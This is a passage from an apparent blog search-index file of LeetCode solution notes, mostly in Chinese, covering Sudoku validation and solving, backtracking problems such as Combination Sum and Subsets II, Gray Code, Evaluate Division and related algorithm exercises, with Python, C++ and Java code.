&#123;\"1\":0,\"2\":0,\"3\":0, \"4\":0,\"5\":0, \"6\":0, \"7\":0, \"8\":0, \"9\":0&#125; for x in alist: if x == '.': continue if mydict[x] == 0: mydict[x] = 1 else: return False return True def isValidSudoku(self, board): \"\"\" :type board: List[List[str]] :rtype: bool \"\"\" import numpy as np import copy myboard = np.array(board) for i in range(9): # Each row, column must contain the digits 1-9 without repetition. eachrow = myboard[i,:] repetation = self.no_repetation(eachrow) if not repetation: return False # Each row, column must contain the digits 1-9 without repetition. eachcolumn = myboard[:,i] repetation = self.no_repetation(eachcolumn) if not repetation: return False # Each of the 9 3x3 sub-boxes of the grid must contain the digits 1-9 without repetition. for i in range(3): for j in range(3): eachblock = myboard[i*3:(i+1)*3, j*3:(j+1)*3].reshape((-1,)) repetation = self.no_repetation(eachblock) if not repetation: return False return True``` 还有一种更巧妙的方法，就是每一行、每一列、每一块都是一个字典预先放在列表中；并且对于块的处理，巧妙的利用矩阵元素的行列数计算所在的块：```pythonclass Solution: def isValidSudoku(self, board): \"\"\" :type board: List[List[str]] :rtype: bool \"\"\" dic_row = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;] dic_col = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;] dic_box = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;] for i in range(len(board)): for j in range(len(board)): num = board[i][j] if num == \".\": continue if num not in dic_row[i] and num not in dic_col[j] \\\\ and num not in dic_box[3*(i//3)+(j//3)]: dic_row[i][num] = 1 dic_col[j][num] = 1 dic_box[3*(i//3)+(j//3)][num] = 1 else: return False return True 对应的C++版本为： 12345678910111213141516bool isValidSudoku(vector&lt;vector&lt;char&gt; &gt; &amp;board) &#123; int used1[9][9] = &#123;0&#125;, used2[9][9] = &#123;0&#125;, used3[9][9] = &#123;0&#125;; for(int i = 0; i &lt; board.size(); ++ i) for(int j = 0; j &lt; board[i].size(); ++ j) if(board[i][j] != '.') &#123; int num = board[i][j] - '0' - 1, k = i / 3 * 3 + j / 3; if(used1[i][num] || used2[j][num] || used3[k][num]) return false; used1[i][num] = used2[j][num] = used3[k][num] = 1; &#125; return true; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"37. Sudoku Solver","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-37-Sudoku-Solver/","text":"题目Write a program to solve a Sudoku puzzle by filling the empty cells. A sudoku solution must satisfy all of the following rules: Each of the digits 1-9 must occur exactly once in each row.Each of the digits 1-9 must occur exactly once in each column.Each of the the digits 1-9 must occur exactly once in each of the 9 3x3 sub-boxes of the grid.Empty cells are indicated by the character .. A sudoku puzzle… …and its solution numbers marked in red. Note: The given board contain only digits 1-9 and the character .. You may assume that the given Sudoku puzzle will have a single unique solution. The given board size is always 9x9. 思路123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475class Solution &#123;public: // 判断数独是否有效 bool isValidSudoku(vector&lt;vector&lt;char&gt;&gt; &amp;board) &#123; int used1[9][9] = &#123;0&#125;, used2[9][9] = &#123;0&#125;, used3[9][9] = &#123;0&#125;; for(int i = 0; i &lt; board.size(); ++ i) for(int j = 0; j &lt; board[i].size(); ++ j) if(board[i][j] != '.') &#123; int num = board[i][j] - '0' - 1, k = i / 3 * 3 + j / 3; if(used1[i][num] || used2[j][num] || used3[k][num])&#123; return false; &#125; used1[i][num] = used2[j][num] = used3[k][num] = 1; &#125; return true; &#125; // 判断Sudoku是否已经填满，如果不填满返回一个空缺位置 vector&lt;int&gt; isfull(vector&lt;vector&lt;char&gt;&gt; &amp;board)&#123; vector&lt;int&gt; h; int n = board.size(); for (int i=0; i&lt; n; i++)&#123; for (int j=0; j&lt;n; j++)&#123; if (board[i][j]=='.')&#123; h.push_back(i); h.push_back(j); return h; &#125; &#125; &#125; return h; &#125; bool solveSudokuHelper(vector&lt;vector&lt;char&gt;&gt;&amp; board)&#123; vector&lt;int&gt; h = isfull(board); if (!h.size())&#123; // base case return true; &#125; else&#123; int column = h[1]; int row = h[0]; for (int i=1; i&lt;10 ; i++)&#123; board[row][column] = i + '0'; if (isValidSudoku(board))&#123; //choose and explore bool solved = solveSudokuHelper(board); if (solved)&#123; // 只需要1个解即可 return true; &#125; //unchoose board[row][column] = '.'; &#125; else&#123; board[row][column] = '.'; &#125; &#125; &#125; return false; &#125; void solveSudoku(vector&lt;vector&lt;char&gt;&gt;&amp; board) &#123; solveSudokuHelper(board); &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"370. Range Addition","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-370-Range-Addition/","text":"Assume you have an array of length $n$ initialized with all 0’s and are given $k$ update operations. Each operation is represented as a triplet: [startIndex, endIndex, inc] which increments each element of subarray A[startIndex ... endIndex] (startIndex and endIndex inclusive) with inc. Return the modified array after all $k$ operations were executed. Example: 123456789101112131415161718Given: length = 5, updates = [ [1, 3, 2], [2, 4, 3], [0, 2, -2] ]Output: [-2, 0, 3, 5, 3]Explanation: Initial state: [ 0, 0, 0, 0, 0 ] After applying operation [1, 3, 2]: [ 0, 2, 2, 2, 0 ] After applying operation [2, 4, 3]: [ 0, 2, 5, 5, 3 ] After applying operation [0, 2, -2]: [-2, 0, 3, 5, 3 ] Hint: Thinking of using advanced data structures? You are thinking it too complicated. For each update operation, do you really need to update all elements between $i$ and $j$? Update only the first and end element is sufficient. The optimal time complexity is $O(k + n)$ and uses $O(1)$ extra space. JavaLintCode链接。暴力法：每次更新[startIndex, endIndex]区间 12345678public int[] getModifiedArray(int length, int[][] updates) &#123; int[] res = new int[length]; for (int i = 0; i &lt; updates.length; i++) for (int j = updates[i][0]; j &lt;= updates[i][1]; j++) res[j] += updates[i][2]; return res;&#125; 比较巧妙的方法： 1234567891011public int[] getModifiedArray(int length, int[][] updates) &#123; int[] arr = new int[length + 1], res = new int[length]; for (int[] update : updates) &#123; arr[update[0]] += update[2]; arr[update[1] + 1] -= update[2]; &#125; res[0] = arr[0]; for (int i = 1; i &lt; length; i++) res[i] = res[i - 1] + arr[i]; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"372. Super Pow","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-372-Super-Pow/","text":"Your task is to calculate $a^b$ mod 1337 where $a$ is a positive integer and $b$ is an extremely large positive integer given in the form of an array. Example 1: 12Input: a = 2, b = [3]Output: 8 Example 2: 12Input: a = 2, b = [1,0]Output: 1024 Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"90. Subsets II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-90-Subsets-II/","text":"题目Given a collection of integers that might contain duplicates, nums, return all possible subsets (the power set). Note: The solution set must not contain duplicate subsets. Example: 12345678910Input: [1,2,2]Output:[ [2], [1], [1,2,2], [2,2], [1,2], []] 分析这道题目与Leetcode 78. Subsets的唯一不同点为给的整数有可能出现重复。其实和40. Combination Sum II、47. Permutations II的处理技巧相同：先排序，然后直接跳过重复的元素。 1234567891011121314151617181920212223class Solution &#123;public: vector&lt;vector&lt;int&gt; &gt; subsetsWithDup(vector&lt;int&gt; &amp;nums) &#123; vector&lt;vector&lt;int&gt; &gt; res; vector&lt;int&gt; vec; sort(nums.begin(), nums.end()); subsetsWithDupHelper(res, nums, nums.size(), vec, 0); return res; &#125;private: void subsetsWithDupHelper(vector&lt;vector&lt;int&gt; &gt; &amp;res, vector&lt;int&gt; &amp;nums, int n, vector&lt;int&gt; &amp;vec, int position) &#123; res.push_back(vec); for (int i = position; i &lt; n; ++i) &#123; if ((i&gt;position)&amp;&amp;(nums[i]==nums[i-1]))&#123; continue; &#125; else&#123; vec.push_back(nums[i]); subsetsWithDupHelper(res, nums, n, vec, i + 1); vec.pop_back(); &#125; &#125; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"89. Gray Code","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-89-Gray-Code/","text":"题目The gray code is a binary numeral system where two successive values differ in only one bit. Given a non-negative integer $n$ representing the total number of bits in the code, print the sequence of gray code. A gray code sequence must begin with 0. For example, given $n = 2$, return [0,1,3,2]. Its gray code sequence is: 123400 - 001 - 111 - 310 - 2 Note:For a given $n$, a gray code sequence is not uniquely defined. For example, [0,2,3,1] is also a valid gray code sequence according to the above definition. For now, the judge is able to judge based on one instance of gray code sequence. Sorry about that. 分析gray code 的wikipedia页面在此。 例举grey code序列，并找规律 : 以$n = 3$为例，grey code中前4个包括了$n = 2$的所有gray code。后4个则是前4个逆序后加上$2^2$。 推广：$n = i$的grey code的前一半包括了$n = i-1$的所有grey code，而后一半则为前一半逆序后加上$2^{(i-1)}$。 在写程序的过程中，特别要注意res的index 以及$i$，$j$的关系。主要是细节问题。 123456789101112131415161718class Solution &#123;public: // a non-negative integer n: the total number of bits in the code // print the sequence of gray code. // A gray code sequence must begin with 0. vector&lt;int&gt; grayCode(int n) &#123; vector&lt;int&gt; res; res.push_back(0); // when n=0, gray code = 0 for(int i=1; i&lt;= n; i++)&#123; for (int j=pow(2,i-1); j&lt; pow(2,i); j++)&#123; res.push_back(res[pow(2,i)-j-1]+pow(2, i-1)); &#125; &#125; return res; &#125;&#125;; 其实还有一种非常简单的方法，直接从数学角度出发的，但需要首先了解gray code。其实在二进制数和gray code之间有转换关系： 12345678910/* * This function converts an unsigned binary * number to reflected binary Gray code. * * The operator &gt;&gt; is shift right. The operator ^ is exclusive or. */unsigned int BinaryToGray(unsigned int num)&#123; return num ^ (num &gt;&gt; 1); //与右移一位的数字按位异或&#125;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"86. Partition List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-86-Partition-List/","text":"Given a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x. You should preserve the original relative order of the nodes in each of the two partitions. Example: 12Input: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3Output: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5 Java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/** * Given a linked list and a value x, partition it, such that * all nodes less than x come before nodes greater than or equal to x. * &lt;p&gt; * You should preserve the original relative order of * the nodes in each of the two partitions. * &lt;p&gt; * Example: * &lt;p&gt; * Input: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3 * Output: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5 * https://leetcode.com/problems/partition-list/description/ * * 这道题目看起来思路是非常简单的，就是要注意细节。 * 解决方案是将大于x的元素放到另一个链表中，最后将两个链表连接起来。 * * 需要注意的有以下几点： * 1. 链表头部元素可能会大于x，为了方便，引入dummy node * 2. 要在新建链表尾部放null，很容易忘记 * * * */public class Q86PartitionList &#123; public static ListNode partition(ListNode head, int x) &#123; if (head == null || head.next == null) &#123; return head; &#125; // another list for nodes (node.val &gt;= x). // add ListNode(0) as a dummy node ListNode head1 = new ListNode(0), head2 = new ListNode(0); head1.next = head; ListNode pos = head1.next, prev = head1, tmp = head2; while (pos != null) &#123; // find notes, whose value if greater or equal than x, // then remove them from head1 and put them in head2 in order, if (pos.val &gt;= x) &#123; // put it in head2 head2.next = pos; head2 = head2.next; // remove it from head prev.next = pos.next; // prev unchanged; no code &#125; else &#123; // change prev prev = pos; &#125; // change pos pos = pos.next; &#125; // end while // 别忘了结束链表 head2.next = null; prev.next = tmp.next; return head1.next; &#125; //end method partition&#125; // end class","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"399. Evaluate Division","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-399-Evaluate-Division/","text":"Equations are given in the format A / B = k, where A and B are variables represented as strings, and k is a real number (floating point number). Given some queries, return the answers. If the answer does not exist, return -1.0. Example:123Given a / b = 2.0, b / c = 3.0. queries are: a / c = ?, b / a = ?, a / e = ?, a / a = ?, x / x = ? . return [6.0, 0.5, -1.0, 1.0, -1.0 ]. The input is: String[][] equations, double[] values, String[][] queries , where equations.size() == values.size(), and the values are positive. This represents the equations. Return double[]. According to the example above: 123equations = [ [&quot;a&quot;, &quot;b&quot;], [&quot;b&quot;, &quot;c&quot;] ],values = [2.0, 3.0],queries = [ [&quot;a&quot;, &quot;c&quot;], [&quot;b&quot;, &quot;a&quot;], [&quot;a&quot;, &quot;e&quot;], [&quot;a&quot;, &quot;a&quot;], [&quot;x&quot;, &quot;x&quot;] ]. The input is always valid. You may assume that evaluating the queries will result in no division by zero and there is no contradiction. Java这道题目的难点在于发现可以用图论解决。对于方程A/B = C，可以把A、B视为图的节点，AB构成图的一条边，C为边的权重。以这种方式构建有向图，那么对于任意方程x/y的问题可以转化为在有向图中，是否存在一条路径$x-y$，如果存在则返回路径的权重。可以用DFS解决，时间复杂度为$O(Q\\times(E+V))$，其中$Q$为查询的数量，$E$为方程数量，$V$为方程中字母的数量。 12345678910111213141516171819202122232425262728293031323334353637383940414243public double[] calcEquation(String[][] equations, double[] values, String[][] queries) &#123; if (equations == null || values == null || queries == null) return new double[]&#123;&#125;; // construct graph Map&lt;String, Map&lt;String, Double&gt;&gt; graph = new HashMap&lt;&gt;(); // graph for (int i = 0; i &lt; equations.length; i++) &#123; String v = equations[i][0], w = equations[i][1]; if (!graph.containsKey(v)) graph.put(v, new HashMap&lt;&gt;()); if (!graph.containsKey(w)) graph.put(w, new HashMap&lt;&gt;()); graph.get(v).put(w, values[i]); graph.get(w).put(v, 1.0/values[i]); &#125; Set&lt;String&gt; mark = new HashSet&lt;&gt;();; Map&lt;String, Double&gt; distTo = new HashMap&lt;&gt;();; double[] res = new double[queries.length]; for (int i = 0; i &lt; queries.length; i++) &#123; String v = queries[i][0], w = queries[i][1]; // invalid query if (!graph.containsKey(v) || !graph.containsKey(w)) &#123; res[i] = -1.0; continue; &#125; // clear dfs result if (i &gt; 0) &#123; distTo.clear(); mark.clear();&#125; // start dfs distTo.put(v, 1.0); dfs(graph, mark, distTo, v); // check result if (!mark.contains(w)) res[i] = -1.0; else res[i] = distTo.get(w); &#125; return res;&#125;private void dfs(Map&lt;String, Map&lt;String, Double&gt;&gt; graph, Set&lt;String&gt; mark, Map&lt;String, Double&gt; distTo, String v) &#123; mark.add(v); for (String w: graph.get(v).keySet()) &#123; if (!mark.contains(w)) &#123; distTo.put(w, distTo.get(v)*graph.get(v).get(w)); dfs(graph, mark, distTo, w); &#125; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"384. Shuffle an Array","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-384-Shuffle-an-Array/","text":"Shuffle a set of numbers without duplicates. Example: 123456789101112// Init an array with set 1, 2, and 3.int[] nums = &#123;1,2,3&#125;;Solution solution = new Solution(nums);// Shuffle the array [1,2,3] and return its result. Any permutation of [1,2,3] must equally likely to be returned.solution.shuffle();// Resets the array back to its original configuration [1,2,3].solution.reset();// Returns the random shuffling of array [1,2,3].solution.shuffle(); Java非常简单。既然要shuffle，肯定想到的是Knuth shuffle，然后题目里说还有个reset功能，那就要保留原来的数组。 123456789101112131415161718192021222324252627282930public class Q384ShuffleAnArray &#123; private int[] array; private Random random; public Q384ShuffleAnArray(int[] nums) &#123; this.array = nums; random = new Random(); &#125; /** Resets the array to its original configuration and return it. */ public int[] reset() &#123; return array; &#125; /** Returns a random shuffling of the array. */ public int[] shuffle() &#123; int[] nums = this.array.clone(); int r, temp; for (int i = 0; i &lt; nums.length; i++) &#123; //In iteration i, pick integer r between 0 and i uniformly at random. r = random.nextInt(i+1); // Swap a[i] and a[r]. temp = nums[i]; nums[i] = nums[r]; nums[r] = temp; &#125; return nums; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"38. Count and Say","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-38-Count-and-Say/","text":"题目The count-and-say sequence is the sequence of integers with the first five terms as following: 123451. 12. 113. 214. 12115. 111221 1 is read off as &quot;one 1&quot; or 11.11 is read off as &quot;two 1s&quot; or 21.21 is read off as &quot;one 2, then one 1&quot; or 1211. Given an integer $n$, generate the nth term of the count-and-say sequence. Note: Each term of the sequence of integers will be represented as a string. Example 1: 12Input: 1Output: &quot;1&quot; Example 2: 12Input: 4Output: &quot;1211&quot; 题意分析： 本题是将数字从1开始，将当前数字转化为口语对应的数字。比如1口语是1个1，记作11；11读作2个1，记作21；21读作1个2，1个1，记作1211…… ‘1’是第一个数字，根据输入的数字n，计算第n个这样的数字。 解答12345678910111213141516171819202122232425262728293031323334353637class Solution(object): def say(self, nn): \"\"\" :type nn: str :rtype: str \"\"\" i = 0 result = \"\" while i &lt; len(nn): count = 1 while i+1 &lt; len(nn) and nn[i] == nn[i+1]: count += 1 i += 1 result += str(count) result += str(nn[i]) i += 1 return result def countAndSay(self, n): \"\"\" :type n: int :rtype: str \"\"\" if n == 1: return str(1) result = str(1) for i in range(1, n): result = self.say(result) return result","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"39. Combination Sum","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-39-Combination-Sum/","text":"题目Given a set of candidate numbers (candidates) (without duplicates) and a target number (target), find all unique combinations in candidates where the candidate numbers sums to target. The same repeated number may be chosen from candidates unlimited number of times. Note: All numbers (including target) will be positive integers. The solution set must not contain duplicate combinations. Example 1: 123456Input: candidates = [2,3,6,7], target = 7,A solution set is:[ [7], [2,2,3]] Example 2: 1234567Input: candidates = [2,3,5], target = 8,A solution set is:[ [2,2,2,2], [2,3,3], [3,5]] 分析典型的backtracking类型题目。关键是输出后的结果会有重复。使用set能将重复的结果剔除。 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;algorithm&gt;class Solution &#123;public: void combinationSumHelper(vector&lt;int&gt;&amp; candidates, int target, set&lt;vector&lt;int&gt;&gt;&amp; result, vector&lt;int&gt; &amp;chosen)&#123; if (target == 0)&#123; // base case vector&lt;int&gt; chosen_sorted(chosen.begin(), chosen.end()); sort(chosen_sorted.begin(), chosen_sorted.end()); result.insert(chosen_sorted); &#125;else&#123; for (vector&lt;int&gt;::iterator iter=candidates.begin(); iter!=candidates.end(); iter++)&#123; if (target&gt;=*iter)&#123; //choose int s = *iter; chosen.push_back(s); //explore combinationSumHelper(candidates, target-s, result, chosen); //unchoose chosen.pop_back(); &#125; &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; combinationSum(vector&lt;int&gt;&amp; candidates, int target) &#123; set&lt;vector&lt;int&gt;&gt; result; vector&lt;int&gt; chosen; combinationSumHelper(candidates, target, result, chosen); vector&lt;vector&lt;int&gt;&gt; finals(result.begin(), result.end()); return finals; &#125;&#125;; 但其实还有更简单的方法： 采用回溯法。由于组合中的数字要按序排列，我们先将集合中的数排序。依次把数字放入组合中，因为所有数都是正数，如果当前和已经超出目标值，则放弃；如果和为目标值，则加入结果集；如果和小于目标值，则继续增加元素。由于结果集中不允许出现重复的组合，所以增加元素时只增加当前元素及之后的元素。 1234567891011121314151617181920212223242526272829303132333435#include &lt;algorithm&gt;class Solution &#123;public: void combinationSumHelper(vector&lt;int&gt;&amp; candidates, int target, vector&lt;vector&lt;int&gt;&gt;&amp; res, vector&lt;int&gt; &amp;chosen, int position)&#123; if (target == 0)&#123; // base case res.push_back(chosen); &#125;else&#123; for (int i=position; (i&lt;candidates.size()) &amp;&amp; (candidates[i]&lt;= target); i++ )&#123; //choose chosen.push_back(candidates[i]); //explore combinationSumHelper(candidates, target-candidates[i], res, chosen, i); //unchoose chosen.pop_back(); &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; combinationSum(vector&lt;int&gt;&amp; candidates, int target) &#123; vector&lt;vector&lt;int&gt;&gt; res; vector&lt;int&gt; chosen; sort(candidates.begin(), candidates.end()); combinationSumHelper(candidates, target, res, chosen, 0); return res; &#125;&#125;; 题目难点在于重复的处理和排序。","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"401. Binary Watch","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-401-Binary-Watch/","text":"A binary watch has 4 LEDs on the top which represent the hours (0-11), and the 6 LEDs on the bottom represent the minutes (0-59). Each LED represents a zero or one, with the least significant bit on the right. For example, the above binary watch reads “3:25”. Given a non-negative integer $n$ which represents the number of LEDs that are currently on, return all possible times the watch could represent. Example: 12Input: n = 1Return: [&quot;1:00&quot;, &quot;2:00&quot;, &quot;4:00&quot;, &quot;8:00&quot;, &quot;0:01&quot;, &quot;0:02&quot;, &quot;0:04&quot;, &quot;0:08&quot;, &quot;0:16&quot;, &quot;0:32&quot;] Note: The order of output does not matter. The hour must not contain a leading zero, for example “01:00” is not valid, it should be “1:00”. The minute must be consist of two digits and may contain a leading zero, for example “10:2” is not valid, it should be “10:02”.","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Bit-Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"85. Maximal Rectangle","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-85-Maximal-Rectangle/","text":"Given a 2D binary matrix filled with 0’s and 1’s, find the largest rectangle containing only 1’s and return its area. Example: 12345678Input:[ [&quot;1&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;], [&quot;1&quot;,&quot;0&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;], [&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;], [&quot;1&quot;,&quot;0&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;]]Output: 6 Java","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"40. Combination Sum II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-40-Combination-Sum-II/","text":"题目Given a collection of candidate numbers (candidates) and a target number (target), find all unique combinations in candidates where the candidate numbers sums to target. Each number in candidates may only be used once in the combination. Note: All numbers (including target) will be positive integers. The solution set must not contain duplicate combinations. Example 1: 12345678Input: candidates = [10,1,2,7,6,1,5], target = 8,A solution set is:[ [1, 7], [1, 2, 5], [2, 6], [1, 1, 6]] Example 2: 123456Input: candidates = [2,5,2,1,2], target = 5,A solution set is:[ [1,2,2], [5]] 分析40题和39题相比，主要差别在每个数字只能使用一次：在explore步骤时采用i+1参数。对于重复的结果，笨办法是使用set。 12345678910111213141516171819202122232425262728293031323334#include &lt;algorithm&gt;class Solution &#123;public: void combinationSum2Helper(vector&lt;int&gt;&amp; candidates, int target, set&lt;vector&lt;int&gt;&gt;&amp; res, vector&lt;int&gt;&amp; chosen, int position)&#123; if (target == 0)&#123; // base case res.insert(chosen); &#125;else&#123; for(int i=position; (i&lt;candidates.size()) &amp;&amp; (candidates[i]&lt;=target);i++)&#123; //choose chosen.push_back(candidates[i]); //explore combinationSum2Helper(candidates, target-candidates[i], res, chosen, i+1); //unchoose chosen.pop_back(); &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; combinationSum2(vector&lt;int&gt;&amp; candidates, int target) &#123; set&lt;vector&lt;int&gt;&gt; res; vector&lt;int&gt; chosen; sort(candidates.begin(), candidates.end()); combinationSum2Helper(candidates, target, res, chosen, 0); vector&lt;vector&lt;int&gt;&gt; res_final(res.begin(), res.end()); return res_final; &#125;&#125;; 有一种更巧妙的办法去除重复，需要仔细分析什么时候会出现重复。其实只有一种情况，那就是在挑选下一个元素时，有前后元素相同。所以可以直接在choose步骤，增加一句 1if (i&amp;&amp;num[i]==num[i-1]&amp;&amp;i&gt;position) continue; // check duplicate combination 完整的程序为 12345678910111213141516171819202122232425262728293031323334353637#include &lt;algorithm&gt;class Solution &#123;public: void combinationSum2Helper(vector&lt;int&gt;&amp; candidates, int target, vector&lt;vector&lt;int&gt;&gt;&amp; res, vector&lt;int&gt;&amp; chosen, int position)&#123; if (target == 0)&#123; // base case res.push_back(chosen); &#125;else&#123; for(int i=position; (i&lt;candidates.size()) &amp;&amp; (candidates[i]&lt;=target);i++)&#123; if ((i&gt;position) &amp;&amp; (candidates[i]== candidates[i-1]))&#123;// 跳过重复 continue; &#125; else&#123; //choose chosen.push_back(candidates[i]); //explore combinationSum2Helper(candidates, target-candidates[i], res, chosen, i+1); //unchoose chosen.pop_back(); &#125; &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; combinationSum2(vector&lt;int&gt;&amp; candidates, int target) &#123; vector&lt;vector&lt;int&gt;&gt; res; vector&lt;int&gt; chosen; sort(candidates.begin(), candidates.end()); combinationSum2Helper(candidates, target, res, chosen, 0); return res; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"404. Sum of Left Leaves","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-404-Sum-of-Left-Leaves/","text":"Find the sum of all left leaves in a given binary tree. Example: 12345 3 / \\9 20 / \\ 15 7 There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24. Java如果是求所有叶子结点的和会比较简单，为了区分左叶子结点和右叶子节点，特别的，在参数列表上增加了isLeft参数。 123456789101112private static int sum;public int sumOfLeftLeaves(TreeNode root) &#123; sum = 0; sumOfLeftLeavesHelper(root, false); return sum;&#125;private void sumOfLeftLeavesHelper(TreeNode root, boolean isLeft)&#123; if (root == null) return; if (root.left == null &amp;&amp; root.right == null &amp;&amp; isLeft) sum += root.val; sumOfLeftLeavesHelper(root.left, true); sumOfLeftLeavesHelper(root.right, 